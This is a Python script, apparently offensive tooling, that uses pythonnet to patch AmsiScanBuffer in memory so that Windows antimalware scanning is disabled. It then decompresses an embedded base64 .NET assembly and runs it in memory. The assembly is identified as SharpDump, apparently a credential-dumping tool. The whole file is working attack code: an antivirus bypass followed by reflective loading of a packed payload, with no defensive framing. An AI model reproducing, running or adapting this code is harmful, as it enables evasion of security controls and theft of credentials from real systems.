import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def to_clr_array(py_list):
    """
    Converts a Python list to a .NET string array.
    Args:
        py_list: The Python list to convert.
    Returns:
        A .NET string array.
    """
    arr = System.Array.CreateInstance(System.String, len(py_list))
    for i, item in enumerate(py_list):
        arr[i] = item
    return arr

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpDump.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    if method == None:
        method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        print(method)
    # Convert your command to a .NET string array
    command_args = Array[str](command)

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()